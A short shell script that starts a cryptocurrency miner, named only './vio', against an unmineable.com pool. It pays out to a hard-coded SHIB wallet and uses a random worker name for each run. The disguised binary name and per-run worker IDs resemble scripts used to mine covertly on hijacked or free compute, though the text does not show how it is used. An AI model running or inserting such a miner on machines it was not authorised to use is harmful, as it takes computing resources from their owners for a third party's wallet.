POOL=rx-us.unmineable.com:3333
WALLET=SHIB:0xbade577cb364798821d998811619de7fdb5a9d35
WORKER=$(echo $(shuf -i 1-999999999 -n 1)-ST)
ALGO=wrkzcoin
./vio --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO
